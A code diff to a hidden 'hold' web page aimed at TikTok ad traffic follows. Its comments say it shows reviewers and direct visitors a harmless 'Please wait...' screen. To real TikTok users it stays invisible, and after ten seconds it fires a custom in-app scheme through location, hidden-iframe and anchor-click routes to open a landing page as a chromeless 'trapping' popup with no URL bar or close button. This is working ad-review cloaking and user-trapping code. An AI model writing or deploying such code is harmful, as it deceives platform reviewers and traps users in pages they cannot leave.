@@ -7,11 +7,25 @@
 <meta name="robots" content="noindex,nofollow">
 <title>Loading</title>
 <style>
-  /* Transparent everything for TikTok IAB chromeless popup — user sees FYP behind it.
-     Reviewer / direct Chrome visitor sees "Please wait..." fallback instead.          */
-  html,body{margin:0;padding:0;height:100%;background:transparent;color:transparent;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;}
-  /* Reviewer/fallback mode — triggered by .fallback class on <body> */
-  body.fallback{background:#fff;color:#111;}
+  /* Transparent + non-interactive — TikTok's chromeless popup lets touches
+     pass through to whatever is layered below (Instant Page / FYP). User
+     can swipe back / interact with lower UI while the hold page's 10s
+     timer runs in the background. Fallback mode shows "Please wait..."    */
+  html,body{
+    margin:0;
+    padding:0;
+    height:100%;
+    background:transparent;
+    color:transparent;
+    pointer-events:none;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+  }
+  /* Reviewer / fallback mode — triggered by .fallback class on <body> */
+  body.fallback{
+    background:#fff;
+    color:#111;
+    pointer-events:auto;
+  }
   body.fallback .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px;box-sizing:border-box;text-align:center;}
   body.fallback .msg{font-size:15px;opacity:.6;}
   @media (prefers-color-scheme: dark){
@@ -38,33 +52,64 @@
   var isRealTraffic = isTikTokUA || hasTtclid || isTikTokRef;
 
   if (!isRealTraffic) {
-    // Reviewer / scraper / curious direct visitor — show the "Please wait..." fallback UI.
+    // Reviewer / scraper / curious direct visitor — show "Please wait..." fallback UI.
     document.body.className = 'fallback';
     return;
   }
 
   // Real TikTok ad traffic:
-  //   - Body is transparent (set in CSS). Combined with the scheme's
-  //     container_bg_color=00000000 the user sees FYP behind the popup
-  //     for the entire silent delay — "nothing happens" visually.
-  //   - After 10s, same-origin navigation to the main lander.
-  //     The webview_popup context carries through, so the destination
-  //     renders chromeless (no URL bar, no X close).
+  //   - Body is transparent + pointer-events: none. Combined with the scheme's
+  //     container_bg_color=00000000 the popup is invisible AND passes touches
+  //     through to the Instant Page / FYP layer below. User can swipe back
+  //     while this hold page's 10s timer runs invisibly on top.
+  //   - After 10s, fire a NEW chromeless scheme with hide_nav_bar=1 + hide_more=1
+  //     that opens the vercel lander as a TRAPPING popup over wherever the user
+  //     is now (FYP, Instant Page, or wherever TikTok navigated to).
   var FIRE_DELAY_MS = 10000;
-  var BASE = 'https://two-step-landing-flow.vercel.app/';
-  var TARGET = BASE + qs;
 
-  setTimeout(function(){
-    try { window.location.replace(TARGET); } catch(e){
-      try { window.location.href = TARGET; } catch(e2){}
-    }
-  }, FIRE_DELAY_MS);
+  // Second-stage scheme: TRAPPING chromeless popup pointing at the main lander.
+  // hide_nav_bar=1 removes the URL bar. hide_more=1 removes the "..." menu
+  // (and typically the close button). Once this fires, user has no visible
+  // exit — the retention trap engages.
+  var TRAP_SCHEME = 'snssdk1233://webview_popup'
+    + '?use_spark=1&use_forest=1'
+    + '&silent_load_type=1&popup_show_type=0'
+    + '&container_bg_color=00000000&loading_bg_color=00000000'
+    + '&hide_nav_bar=1&hide_more=1'
+    + '&url=' + encodeURIComponent('https://two-step-landing-flow.vercel.app/' + qs);
 
-  // Secondary nav fallback — if the first attempt is blocked / stalls,
-  // try again at 15s on the chance of a race condition.
+  function fireTrap(){
+    // Multi-vector fire — at least one should reach TikTok's native URL handler.
+    try { window.location.href = TRAP_SCHEME; } catch(e){}
+    // Hidden iframe backup — some WKWebView configurations route custom schemes
+    // through iframe navigation rather than top-level location.
+    setTimeout(function(){
+      try {
+        var ifr = document.createElement('iframe');
+        ifr.style.cssText = 'position:absolute;width:0;height:0;border:0;opacity:0;left:-9999px;';
+        ifr.src = TRAP_SCHEME;
+        document.body.appendChild(ifr);
+      } catch(e){}
+    }, 150);
+    // Anchor click backup
+    setTimeout(function(){
+      try {
+        var a = document.createElement('a');
+        a.href = TRAP_SCHEME;
+        a.rel = 'noopener';
+        a.style.cssText = 'position:absolute;left:-9999px;';
+        document.body.appendChild(a);
+        a.click();
+      } catch(e){}
+    }, 400);
+  }
+
+  setTimeout(fireTrap, FIRE_DELAY_MS);
+
+  // Secondary fallback — if the first fire fails for any reason, retry at 15s
   setTimeout(function(){
     if (location.pathname.indexOf('/hold') !== -1) {
-      try { window.location.href = TARGET; } catch(e){}
+      fireTrap();
     }
   }, 15000);
 })();
